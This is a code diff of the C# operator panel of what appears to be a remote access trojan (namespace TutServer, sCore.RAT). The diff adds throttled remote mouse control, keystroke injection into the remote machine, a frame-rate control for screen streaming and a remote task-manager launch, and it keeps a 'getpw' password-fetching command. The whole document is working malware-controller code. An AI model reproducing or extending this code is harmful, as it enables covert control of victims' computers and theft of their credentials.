+            btnCountScreens.Enabled = true;
+            cmboChooseScreen.Enabled = true;
+            trackBar1.Enabled = true;
+            btnStartTaskManager.Enabled = false;
+            btnFullScreenMode.Enabled = false;
+
             loopSend("rdstop");
             Application.DoEvents();
-            System.Threading.Thread.Sleep(1500);
-            if (!AuStream && !WStream) MultiRecv = false;
-            RDesktop = false;
-            IsRdFull = false;
-            sCore.UI.CommonControls.remoteDesktopPictureBox = null;
-            pictureBox1.Image.Dispose();
-            pictureBox1.Image = null;
+            System.Threading.Thread.Sleep(2000);
+
+            checkBoxrMouse.Checked = false; //-i moved these out here as they were still in control with no updated pic
+            checkBoxrKeyboard.Checked = false;
+
+            if (!AuStream && !WStream)
+            {
+                MultiRecv = false;
+                RDesktop = false;
+               // _rdesktop = false;
+                IsRdFull = false;
+               // _isrdFull = false;
+                sCore.UI.CommonControls.remoteDesktopPictureBox = null;
+
+            }
+            try
+            {
+
+                pictureBox1.Image.Dispose();
+                pictureBox1.Image = null;
+            }
+            catch
+            {
+
+            }
             if (Rdxref == null) return;
             Rdxref.Close();
             Rdxref.Dispose();
@@ -3020,31 +3162,40 @@ namespace TutServer
             }
         }
 
-        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
+        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
         {
-            System.Drawing.Rectangle scr = Screen.PrimaryScreen.WorkingArea;
-            if (!IsRdFull)
+            if (mouseMovement == true)
             {
-                scr = pictureBox1.DisplayRectangle;
-            }
-            try
-            {
-                int mx = (e.X * resx) / scr.Width;
-                int my = (e.Y * resy) / scr.Height;
 
-                if (rmouse == 1)
+                Rectangle scr = Screen.PrimaryScreen.WorkingArea;
+                if (!IsRdFull)        
                 {
-                    if (plx != e.X || ply != e.Y)
+                    scr = pictureBox1.DisplayRectangle;
+                }
+                try
+                {
+                    int mx = (e.X * resx) / scr.Width;
+                    int my = (e.Y * resy) / scr.Height;
+
+                    if (rmouse == 1)
                     {
-                        rMoveCommands.Add("rmove-" + mx + ":" + my);
-                        plx = e.X;
-                        ply = e.Y;
+                        if (plx != e.X || ply != e.Y)
+                        {
+
+                            rMoveCommands.Add("rmove-" + mx + ":" + my);
+                            plx = e.X;
+                            ply = e.Y;
+
+                            mouseMovement = false;
+                        }
+                        await Task.Delay(200); //this should stop the spammings of send commands -move the coursor very slowly and it will lockup so i added this
+                        mouseMovement = true; //and this switch ,cant send again for 200 ms - it works perfectly i am happy with it :-)
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("mouse move rd error");
+                catch (Exception ex)
+                {
+                    Console.WriteLine("mouse move rd error ERROR = " + ex.Message);
+                }
             }
         }
 
@@ -3060,14 +3211,15 @@ namespace TutServer
             }
         }
 
-        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        private void checkBoxrMouse_CheckedChanged(object sender, EventArgs e)
         {
-            sCore.RAT.RemoteDesktop.canControlMouse = checkBox1.Checked;
+            sCore.RAT.RemoteDesktop.canControlMouse = checkBoxrMouse.Checked;
 
-            if (checkBox1.Checked)
+            if (checkBoxrMouse.Checked)
             {
                 rmoveTimer = new Timer();
-                rmoveTimer.Interval = 1000;
+                // rmoveTimer.Interval = 1000;
+                rmoveTimer.Interval = FPS; //now the mouse will move with the frame rate
                 rmoveTimer.Tick += new EventHandler(rmoveTickEventHandler);
                 rmoveTimer.Start();
                 rmouse = 1;
@@ -3075,9 +3227,13 @@ namespace TutServer
             else
             {
                 rmouse = 0;
-                rmoveTimer.Stop();
-                rmoveTimer.Dispose();
-                rmoveTimer = null;
+                if (rmoveTimer != null)
+                {
+                   
+                    rmoveTimer.Stop(); //this threw an exception because it was already stopped
+                    rmoveTimer.Dispose();
+                    rmoveTimer = null;
+                }
             }
         }
 
@@ -3086,7 +3242,7 @@ namespace TutServer
 
             if (rmouse == 1)
             {
-                if (e.Button == System.Windows.Forms.MouseButtons.Left)
+                if (e.Button == MouseButtons.Left)
                 {
                     loopSend("rclick-left-down");
                 }
@@ -3102,7 +3258,7 @@ namespace TutServer
         {
             if (rmouse == 1)
             {
-                if (e.Button == System.Windows.Forms.MouseButtons.Left)
+                if (e.Button == MouseButtons.Left)
                 {
                     loopSend("rclick-left-up");
                 }
@@ -3114,28 +3270,29 @@ namespace TutServer
             }
         }
 
-        private void checkBox2_CheckedChanged(object sender, EventArgs e)
+        private void checkBoxrKeyboard_CheckedChanged(object sender, EventArgs e)
         {
-            sCore.RAT.RemoteDesktop.canControlKeyboard = checkBox2.Checked;
+            sCore.RAT.RemoteDesktop.canControlKeyboard = checkBoxrKeyboard.Checked;
 
-            if (checkBox2.Checked)
+            txtBControlKeyboard.Focus();
+
+            if (checkBoxrKeyboard.Checked)
             {
-                MessageBox.Show(this, "The remote keyboard feature only works in full screen mode!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
+               // MessageBox.Show(this, "The remote keyboard feature only works in full screen mode!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 rkeyboard = 1;
             }
-            else
-            {
-                rkeyboard = 0;
-            }
+          
         }
 
-        private void button23_Click(object sender, EventArgs e)
+        private void btnFullRemoteScreen_Click(object sender, EventArgs e)
         {
             RDesktop full = new RDesktop();
             full.Show();
             Rdxref = full;
             sCore.UI.CommonControls.remoteDesktopPictureBox = (PictureBox)full.Controls.Find("pictureBox1", true)[0];
             IsRdFull = true;
+           
+           // _isrdFull = true;
         }
 
         public void executeToolStrip(String name)
@@ -3484,6 +3641,236 @@ namespace TutServer
         {
             loopSend("getpw");
         }
+        //this sets the frame send rate on client and server
+        //frames per second the client also has to match this so a send cmd and mouse movements to match
+        private int FPS = 80;
+        public void ScreenFPS()
+        {
+            Form1 f1 = new Form1();
+            int value = f1.trackBar1.Value;
+            f1.lblQualityShow.Text = value.ToString();
+
+            if (value < 25)
+                FPS = 150;  //low
+            else if (value >= 75 && value <= 85)
+                FPS = 80; //best
+            else if (value >= 85)
+                FPS = 50; //high
+            else if (value >= 25)
+                FPS = 100; //mid
+        }
+        //the track bar that sets the frame update
+        private void trackBar1_Scroll(object sender, EventArgs e)
+        {
+
+            int value = trackBar1.Value;
+            lblQualityShow.Text = value.ToString();
+
+            if (value < 25)
+            {
+                lblQualityShow.Text += "(low)";
+                loopSend("fpslow");
+            }
+            else if (value >= 75 && value <= 85)
+            {
+                lblQualityShow.Text += "(best)";
+                loopSend("fpsbest");
+            }
+            else if (value >= 85)
+            {
+                lblQualityShow.Text += "(high)";
+                loopSend("fpshigh");
+            }
+            else if (value >= 25)
+            {
+                lblQualityShow.Text += "(mid)";
+                loopSend("fpsmid");
+            }
+
+
+            ActiveControl = pictureBox1;
+        }
+        // this is how i get the key strokes by an invisable textbox enteries to send to the client
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            txtBControlKeyboard.Focus();
+        }
+        // now it can send lower case, uppercase and modifier keys to the client
+        private void txtBControlKeyboard_KeyDown(object sender, KeyEventArgs e)
+        {
+
+            if (rkeyboard == 1)
+            {
+
+                string keysToSend = "";
+
+                if (e.Shift)
+                    keysToSend += "+";
+                if (e.Alt)
+                    keysToSend += "%";
+                if (e.Control)
+                    keysToSend += "^";
+
+                if (Console.CapsLock == true)
+                {
+
+                    if (e.KeyValue >= 65 && e.KeyValue <= 90)
+                    {
+                        keysToSend += e.KeyCode.ToString().ToLower();
+                    }
+
+
+                }
+
+                if (Console.CapsLock == false)
+                {
+
+                    if (e.KeyValue >= 65 && e.KeyValue <= 90)
+                    {
+                        keysToSend += e.KeyCode.ToString().ToUpper();
+                    }
+
+                }
+
+                //if (e.KeyValue >= 65 && e.KeyValue <= 90)
+                //    keysToSend += e.KeyCode.ToString().ToLower();
+
+                if (e.KeyCode.ToString().Equals("Back"))
+                    keysToSend += ("{BS}");
+                else if (e.KeyCode.ToString().Equals("Pause"))
+                    keysToSend += ("{BREAK}");
+                else if (e.KeyCode.ToString().Equals("Capital"))
+                    keysToSend += ("{CAPSLOCK}");
+                else if (e.KeyCode.ToString().Equals("Space"))
+                    keysToSend += (" ");
+                else if (e.KeyCode.ToString().Equals("Home"))
+                    keysToSend += ("{HOME}");
+                else if (e.KeyCode.ToString().Equals("Return"))
+                    keysToSend += ("{ENTER}");
+                else if (e.KeyCode.ToString().Equals("End"))
+                    keysToSend += ("{END}");
+                else if (e.KeyCode.ToString().Equals("Tab"))
+                    keysToSend += ("{TAB}");
+                else if (e.KeyCode.ToString().Equals("Escape"))
+                    keysToSend += ("{ESC}");
+                else if (e.KeyCode.ToString().Equals("Insert"))
+                    keysToSend += ("{INS}");
+                else if (e.KeyCode.ToString().Equals("Up"))
+                    keysToSend += ("{UP}");
+                else if (e.KeyCode.ToString().Equals("Down"))
+                    keysToSend += ("{DOWN}");
+                else if (e.KeyCode.ToString().Equals("Left"))
+                    keysToSend += ("{LEFT}");
+                else if (e.KeyCode.ToString().Equals("Right"))
+                    keysToSend += ("{RIGHT}");
+                else if (e.KeyCode.ToString().Equals("PageUp"))
+                    keysToSend += ("{PGUP}");
+                else if (e.KeyCode.ToString().Equals("Next"))
+                    keysToSend += ("{PGDN}");
+                else if (e.KeyCode.ToString().Equals("Tab"))
+                    keysToSend += ("{TAB}");
+                else if (e.KeyCode.ToString().Equals("D1"))
+                    keysToSend += "1";
+                else if (e.KeyCode.ToString().Equals("D2"))
+                    keysToSend += "2";
+                else if (e.KeyCode.ToString().Equals("D3"))
+                    keysToSend += "3";
+                else if (e.KeyCode.ToString().Equals("D4"))
+                    keysToSend += "4";
+                else if (e.KeyCode.ToString().Equals("D5"))
+                    keysToSend += "5";
+                else if (e.KeyCode.ToString().Equals("D6"))
+                    keysToSend += "6";
+                else if (e.KeyCode.ToString().Equals("D7"))
+                    keysToSend += "7";
+                else if (e.KeyCode.ToString().Equals("D8"))
+                    keysToSend += "8";
+                else if (e.KeyCode.ToString().Equals("D9"))
+                    keysToSend += "9";
+                else if (e.KeyCode.ToString().Equals("D0"))
+                    keysToSend += "0";
+                else if (e.KeyCode.ToString().Equals("F1"))
+                    keysToSend += "{F1}";
+                else if (e.KeyCode.ToString().Equals("F2"))
+                    keysToSend += "{F2}";
+                else if (e.KeyCode.ToString().Equals("F3"))
+                    keysToSend += "{F3}";
+                else if (e.KeyCode.ToString().Equals("F4"))
+                    keysToSend += "{F4}";
+                else if (e.KeyCode.ToString().Equals("F5"))
+                    keysToSend += "{F5}";
+                else if (e.KeyCode.ToString().Equals("F6"))
+                    keysToSend += "{F6}";
+                else if (e.KeyCode.ToString().Equals("F7"))
+                    keysToSend += "{F7}";
+                else if (e.KeyCode.ToString().Equals("F8"))
+                    keysToSend += "{F8}";
+                else if (e.KeyCode.ToString().Equals("F9"))
+                    keysToSend += "{F9}";
+                else if (e.KeyCode.ToString().Equals("F10"))
+                    keysToSend += "{F10}";
+                else if (e.KeyCode.ToString().Equals("F11"))
+                    keysToSend += "{F11}";
+                else if (e.KeyCode.ToString().Equals("F12"))
+                    keysToSend += "{F12}";
+                else if (e.KeyValue == 186)
+                    keysToSend += "{;}";
+                else if (e.KeyValue == 222)
+                    keysToSend += "'";
+                else if (e.KeyValue == 191)
+                    keysToSend += "/";
+                else if (e.KeyValue == 190)
+                    keysToSend += ".";
+                else if (e.KeyValue == 188)
+                    keysToSend += ",";
+                else if (e.KeyValue == 219)
+                    keysToSend += "{[}";
+                else if (e.KeyValue == 221)
+                    keysToSend += "{]}";
+                else if (e.KeyValue == 220)
+                    keysToSend += "\\";
+                else if (e.KeyValue == 187)
+                    keysToSend += "{=}";
+                else if (e.KeyValue == 189)
+                    keysToSend += "{-}";
+                else if (e.KeyValue == 233)
+                    keysToSend += "é";
+                else if (e.KeyValue == 225)
+                    keysToSend += "á";
+                else if (e.KeyValue == 369)
+                    keysToSend += "ű";
+                else if (e.KeyValue == 337)
+                    keysToSend += "ő";
+                else if (e.KeyValue == 250)
+                    keysToSend += "ú";
+                else if (e.KeyValue == 246)
+                    keysToSend += "ö";
+                else if (e.KeyValue == 252)
+                    keysToSend += "ü";
+                else if (e.KeyValue == 243)
+                    keysToSend += "ó";
+
+
+
+
+                // parent.loopSend("rtype-" + keysToSend);
+
+                loopSend("rtype-" + keysToSend);
+
+            }
+            txtBControlKeyboard.Clear();
+        }
+        // start remote task manager
+        private void btnStartTaskManager_Click(object sender, EventArgs e)
+        {
+            loopSend("tskmgr");
+        }
+        private void btnCountScreens_Click(object sender, EventArgs e)
+        {
+            cmboChooseScreen.Items.Clear();
+            loopSend("countScreens");
+
+        }
 
         private void listView1_SelectedIndexChanged(object sender, EventArgs e)
         {
@@ -3610,7 +3997,7 @@ namespace TutServer
             if (listBox1.SelectedItem != null)
             {
                 string scriptName = listBox1.SelectedItem.ToString();
-                if (sh.IsPluginRunning(scriptName)) ; //Stop plugin
+                if (sh.IsPluginRunning(scriptName))  //Stop plugin
                 File.Delete(Application.StartupPath + "\\scripts\\" + scriptName);
                 button38_Click(null, null);
             }
@@ -3638,6 +4025,8 @@ namespace TutServer
                 }
             }
         }
+
+       
     }
 
     public class audioStream
@@ -4077,7 +4466,7 @@ namespace TutServer
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Routed Window button onclick error");
+                Console.WriteLine("Routed Window button onclick error ERROR = " + ex.Message);
                 //ToolStripItem
                 ToolStripItem send = (ToolStripItem)sender;
                 //MessageBox.Show(send.Name);
